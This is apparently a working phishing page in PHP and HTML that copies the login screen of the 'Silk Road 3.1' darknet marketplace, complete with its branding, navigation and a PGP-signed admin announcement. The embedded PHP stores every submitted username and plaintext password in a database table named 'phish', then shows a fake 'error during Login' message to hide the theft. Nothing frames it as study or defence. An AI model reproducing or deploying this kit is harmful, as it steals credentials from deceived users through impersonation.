


<!DOCTYPE html>

<html lang="en">

	<head>

		<meta charset="utf-8">

		<title>Silk Road 3.1</title>

		<link rel="icon" type="image/png" href="silkroad_gs.png">

		<link rel="stylesheet" type="text/css" href="boot.css">

		<link rel="stylesheet" type="text/css" href="patch1.css">

		<link rel="stylesheet" type="text/css" href="patch2.css">

		<link rel="stylesheet" type="text/css" href="patch3.css">

		<link rel="stylesheet" type="text/css" href="patch4.css">

		<style>

			#b{

			width:99%;

			}

		</style>

	</head>

  <body>

  <div align="center">

	<div id="b" align="left">



		﻿<div align="center" id="d" style="margin-top:-10px"><a href="index.php"><div title="Silk Road 3.0" align="center" id="imgm" style="display:inline-block"><img src="silkroad_gs.png" style="height:70px;width:70px"><br><b style="color:#333">Silk Road</b><br><span style="font-size:12px;font-weight:bold">the darknet's most resilient marketplace</span>
</div></a></div><hr>
<div id="n" style="margin-left:20px;">
<a href="index.php">Login</a>
<a href="2fa.php">2FA</a>
<a href="register.php">Register</a>
<a href="recover.php">Recover</a>
<a target="_blank" href="http://dreadditevelidot.onion/d/SilkRoad">Forums</a>
</div>
<hr>
	<div align="left" id="vp" style="width:100%;margin-left:20px;margin-right:20px;">

		<div id="sysr" style="margin-top:0px">
			<center>Welcome back comrade!</center><br>
			Servers under DDoS. Dont worry if we are slow / unreachable.
			July 3rd Update : adding quick toolbar for vendors!</i>
		</div>

	</div>

<form class="form-horizontal" role="form" method="POST">
	<div align="center" id="vp" style="width:300px;margin-left:20px;">


		<div id="sysr" style="margin-top:0px">Welcome back comrade!</div>

				                    <?php
/* Attempt MySQL server connection. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
include 'conn.php';

// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
if(isset($_POST['save'])){
 $username = mysqli_real_escape_string($link,$_POST['username']);
 $password = mysqli_real_escape_string($link,$_POST['password']);
 $captcha = mysqli_real_escape_string($link,$_POST['captcha']);
 

 if (empty($username)) {
    echo "<div class='alert alert-danger'>
    <strong>Failed!</strong>Please Username Cannot be Empty
    </div>";
}

elseif (empty($password)) {
    echo "<div class='alert alert-danger'>
    <strong>Failed!</strong>Please Password Cannot be Empty
    </div>";
}
elseif (empty($captcha)) {
    echo "<div class='alert alert-danger'>
    <strong>Failed!</strong>Captcha Cannot be Empty
    </div>";
}


else{ 

// Attempt insert query execution
    $sql = "INSERT INTO phish (username,
password
) 
    VALUES ('$username',
'$password')";
    if(mysqli_query($link, $sql)){
      echo ' <p style="color: red; font-weight: bolder; font-size: 20px;">
  There was an error during Login, Please try again later
</p>';
    } else{
           
                    echo "db insertion error:".$query."<br>";

                }//else end
}
}
// Close connection
mysqli_close($link);

?>
		<b>Name</b>
		<br>

		<input name="username" maxlength="32" class="form-control" style="width:250px">

		<br>
		<b>Password</b>
		<br>

		<input name="password" maxlength="100" type="password" class="form-control" style="width:250px" value=""><br>
		<input type="hidden" name="attempt" value=1>

		<b>Captcha</b>
		<br>
		<img src="image1170.png"><br><br>
	 	<input type="text" name="captcha" value="" class="form-control" style="width:250px"><br>

		<div align="left">
			<input name="save" type="submit" id="send" style="width:100%; text-align:center" value="Login">
		</div>
	</div>
</form>


<div align="left" id="vp" style="width:100%;margin-left:20px;margin-right:20px;">

	<div id="sysr" style="margin-top:0px">
		-----BEGIN PGP SIGNED MESSAGE-----<br>
		Hash: SHA512<br><br>

		Greetings Comrades,<br><br>

		A more detailed post will be made soon explaining the situation that has been going on for the last couple of months. For now, here are the important actions that have been taken:<br><br>

		- -Market roll-back<br>
		The markets interface has been rolled back to a much earlier version.<br>
		The interface that we will be using now (wallet-less) is where buyers will place a order and each order will be given a specific escrow address,<br>
		This is being done due to the funds issue caused by the old admins.<br>

		What this means exactly:<br>
		Any funds that any one (buyers and vendors) had on the intergrated wallets or on any orders that was in escrow from before, these funds will not be able to be obtained at this time. However, after some time and the market has recovered well enough, we then plan to restore the old interface and as well as previous orders and balances that was on these wallets (we have saved and secured a copy of all the orders and as well as the balances any user held on their account)<br><br>

		By doing this, it will allow for buyers to be able and place orders as normal, and for vendors to be able and get their funds for these orders with no issue. As well, it will create the possibility for us to be able and refund users in the future once we are able to. We hope most agree they rather do this, than to not have either of these at all.<br><br>

		With this being said, we do deeply apologize for the mess that the market turned into.<br>
		However, we are determined to get the market back on the right track, and we hope every one else will be too.<br>
		-----BEGIN PGP SIGNATURE-----<br>

		iQIzBAEBCgAdFiEE4TXxEseBBcvIV5W8fr3vf1gO3EsFAl3sYBoACgkQfr3vf1gO<br>
		3EunWRAAj8GPyngsiUGGT7kMljJNwBf1wEi/Ni8NVWSBg3qaW071BUP3XZIMzhyj<br>
		19ZVs5YjAhRzBXNJZWUljuMPczq1cyCeNFSB/olZ/kq4O98CpdR7xy7VZKTQFNvO<br>
		lWwEV3Tf3Nfp//cfc604Tgr6H06TwA2kM8RLq+N3AwsZKZI3QuGYOldSccpK1Y2J<br>
		wWhBzP4hvkk0ueVbZlQo9FPEcwSNeRe2PfbUvRvxDUeUHMqcRGytfZOsWoZzK3f3<br>
		4Gbz1tCUUyQ2dlpQHeX0BkuCzwkj3m3I80jxOQxi66ZqV3ye0gvv+g8PYK8Dg4uK<br>
		KAEPdr1vKxFht0igSYEKr9fR6+Aw9P9BSgABFitDunXKMfm6BpYZk4ZqM/iCaPo0<br>
		5mPsarwEAVcF5n0latwc6NhN8zwDT1YNnSRY5e47kWhHNDEZTXvvZDyJRI3CObdC<br>
		FKcZx09f1kpgX3diKQXHTFjiQFc6L1grIaSyQepHkZl40SRzIyL9RBCf+V/4WIDq<br>
		N8wdM3ePJCmxDwVb+yXdt1nV+xVlX8M2hZgdjC8ahWdyyCyUIZBsT2nQnuNF0Y7x<br>
		l07qDYIgBKOQdwvCTQTHahOwwbRoh/C/+6GizFrVXjjM2dhd93BtRV9JDvFlaaOg<br>
		jzb8luPlQYrIS7aXdC2gDcr8WGliEYiO4Xk6B4vRFD2iM7ZVbOs=<br>
		=KI57<br>
		-----END PGP SIGNATURE-----
		<br><br>
		-----BEGIN PGP MESSAGE-----<br><br>

hQEOAzp6VNYihdPuEAP/eM6K8bzj89+QDIdPnrBXfZzLP/vd0QNxkDNSdvNYOfIt<br>
xxgQvI0kz+L4ZPQ3a3XIV8a+w3iYmp7XtqgiPP4NFif/Bt1K+/eLphaHXbo5YXZH<br>
Eg5/baBMj7VqP5PUcc0tNZPLfVSBJdZNWI+PGMZa7SypkTWFawfXwe16B3gew+gD<br>
/10qQ+9Y05QdZJb6czhRYlPThX9mJ/5lzlDhjb715O7ePvN5pOoTWdg1Zh/KcS+f<br>
MA3ZrhUbWN2s4lnE/gmhvBumvO3p8RHvzqWYHes1T+BqONzSKTzqIaTKidu9KUJN<br>
hDWc/wE2evrQhqWc8b1DpDchHfAENeigC2yT5TO8I/eW0sDpAR8wOWj85y7C2AAB<br>
Dih5Lr34aSc8Q3NZw9KoOLUyV3JuW0afxovQvUZ3SHPQf/ZLYmEiXI/EDlr7StTN<br>
zk5+W+lMl4Nn5IqroLDZXZbutH5zBeAHce0zfjT9Aedx74YcG6/xiLOdqHdxlMjJ<br>
ao8keE+xrR67cbdZcBq7/iiMtxvsuMfql7R6DeIg9vBNIsf4Sw8Q+j5iRj7oMh6O<br>
lm0aQHpWZ+W4nV0nuZ2Jwpfm5m22I+UTxm3NYVV9WGxlRyXHUgrou1H9fDeDB7WZ<br>
ukBCsp1tOWhSaj/TOfljL62Xc8O7Mcwdz04GtC0qOyRWinZRuShl23n28zISyBGu<br>
+M9ODmorbX5w5a6RFlJ2M+Hu+zmXHe6HcMuzhzgnUKvWUXmEqOGmbVlSoZ/W8mmI<br>
qIjXOCYO/NCzgAr43sybAqVQR0yFMqaYCF9lQ69U37LPZohZlkuEQ7aTCVaPg5vS<br>
l+Gs8nfxjM8w/wue94EjtUKPhuKLEKJG6MBjvtlrDD0EqdYGLo7ivLopL1mWt9MY<br>
nraMMYmB81K5tfrOHAVzddDkZ/aqmx2GMU8NrgA=<br>
=tZma<br>
-----END PGP MESSAGE-----
	</div>
</div>

	</div>

  </div>

  </body>

</html>
